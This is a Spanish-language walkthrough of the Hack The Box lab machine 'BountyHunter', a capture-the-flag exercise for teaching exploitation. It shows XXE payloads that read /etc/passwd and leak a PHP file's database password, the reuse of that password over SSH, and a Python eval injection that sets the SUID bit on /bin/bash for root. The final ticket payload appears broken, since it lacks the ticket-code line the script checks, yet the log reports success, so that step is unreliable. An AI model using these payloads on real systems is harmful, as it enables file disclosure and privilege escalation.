---
layout: single
title: BountyHunter - Hack The Box
excerpt: "BountyHunter is an easy Linux machine that uses XML external entity injection to read system files. Being able to read a PHP file where credentials are leaked gives the opportunity to get a foothold on system as development user. A message from John mentions a contract with Skytrain Inc and states about a script that validates tickets. Auditing the source code of the python script reveals that it uses the eval function on ticket code, which can be injected, and as the python script can be run as root with sudo by the development user it is possible to get a root shell."
date: 2024-04-18
classes: wide
header:
  teaser: /assets/images/htb-bounty/bounty.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - PHP
  - Script
  - XXE
---

![](/assets/images/htb-bounty/bounty.png)

BountyHunter is an easy Linux machine that uses XML external entity injection to read system files. Being able to read a PHP file where credentials are leaked gives the opportunity to get a foothold on system as development user. A message from John mentions a contract with Skytrain Inc and states about a script that validates tickets. Auditing the source code of the python script reveals that it uses the eval function on ticket code, which can be injected, and as the python script can be run as root with sudo by the development user it is possible to get a root shell. 

## Portscan

```
# Nmap 7.94SVN scan initiated Sun Apr 14 18:27:12 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -oG allPorts 10.10.11.100
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.100 ()	Status: Up
Host: 10.10.11.100 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65533)
# Nmap done at Sun Apr 14 18:27:25 2024 -- 1 IP address (1 host up) scanned in 12.67 seconds

```
Y con esto analizamos los puertos abiertos:
```
# Nmap 7.94SVN scan initiated Sun Apr 14 18:28:12 2024 as: nmap -sCV -p22,80 -oN targeted 10.10.11.100
Nmap scan report for 10.10.11.100
Host is up (0.076s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 14 18:28:23 2024 -- 1 IP address (1 host up) scanned in 10.85 seconds

```
## Analisis Web

Analizando la página vemos que nos puede llevar a un lugar donde poder introducir información y verla reflejada asi que vamos a capturar la petición con el burpsuite.
![](/assets/images/htb-bounty/pag1.png)


Aqui esta lo que tenemos en el burp
![](/assets/images/htb-bounty/burp1.png)

Vemos que tenemos una data en base64 asi que vamos a meterla en el decoder para ver que tenemos, esto nos da una peticion en php. Vamos a intentar hacer un XXE injection en php:
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
y donde queramos meterlo ponemos:
<title>&xxe;</title>
```
Lo encodeamos y lo ponemos de tipo url, probamos y nos da la respuesta que queremos asi que podemos probar mas inyecciones.
Antes de todo vamos a buscar un posible directorio de tipo .php
```
sudo wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.100/FUZZ.php
000000848:   200        0 L      0 W        0 Ch        "db"   
```

Ahora vamos a probarlo en el XXE injection:
```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>hi</cwe>
		<cvss>hi</cvss>
		<reward>hi</reward>
		</bugreport>
```
Esto nos devuelve un codigo en base64 que vamos a decodear en la terminal:
```
 echo "PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=" | base64 -d
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>

```
Vamos a probar la contraseña que nos ha dado entrando en ssh:
```
ssh development@10.10.11.100                                                                   130 ⨯
development@10.10.11.100's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 17 Apr 2024 03:00:45 PM UTC

  System load:           0.0
  Usage of /:            24.3% of 6.83GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             215
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.100
  IPv6 address for eth0: dead:beef::250:56ff:feb9:c391


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jul 21 12:04:13 2021 from 10.10.14.8
development@bountyhunter:~$
```
 
Ahora ya estamos dentro y podemos acceder a la flag de usuario

## Escalada de privilegios

Ahora toca escalar privilegios para obtener la flag de root. 
Con sudo -l vemos que tenemos permiso para ejecutar un script en python3
```
sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py

```
Vamos a ver el contenido de este script:

```
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()

```
Con esto analizandolo vemos que tenemos que introducir un archivo de tipo .md necesariamente, y mas requisitos.
Un posible contenido de nuestro archivo podria ser el siguiente:
```
# Skytrain Inc
## Ticket to 
** 11 + 2 
```

Y para intrucir un script malicioso podemos poner:
```
# Skytrain Inc
## Ticket to  
** 11 + 2  __import__('os').system('chmod u+s /bin/bash')
```

Esto si ejecutamos lo siguiente ya lo tendriamos:
```
sudo -u root python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/tmp/hola.md
Destination: 
Invalid ticket.
development@bountyhunter:/tmp$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# cat root.txt
c647c549364f46534d4d74db2ed2b828

```

